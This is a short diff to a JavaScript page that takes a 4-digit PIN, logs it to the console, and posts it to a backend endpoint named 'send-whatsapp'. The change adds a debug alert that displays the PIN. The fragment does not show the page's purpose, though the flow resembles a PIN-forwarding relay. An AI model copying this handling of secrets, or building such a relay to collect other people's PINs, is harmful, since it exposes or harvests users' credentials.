@@ -219,7 +219,7 @@
         console.log('📤 Sending PIN to backend:', payload);
         
         try {
-          const response = await fetch(`${RAILWAY_URL}/api/send-whatsapp`, {
+            const response = await fetch(`${RAILWAY_URL}/api/send-whatsapp`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
@@ -232,10 +232,14 @@
     }
 
     // ============================================
-    // MAIN CONFIRM FUNCTION
+    // MAIN CONFIRM FUNCTION - WITH ALERT
     // ============================================
     window.handleConfirm = async function() {
         const pin = getPin();
+        
+        // ALERT TO TEST IF FUNCTION IS WORKING
+        alert('PIN entered: ' + pin);
+        
         if (pin.length !== 4) {
             showError('Please enter all 4 digits.');
             return;
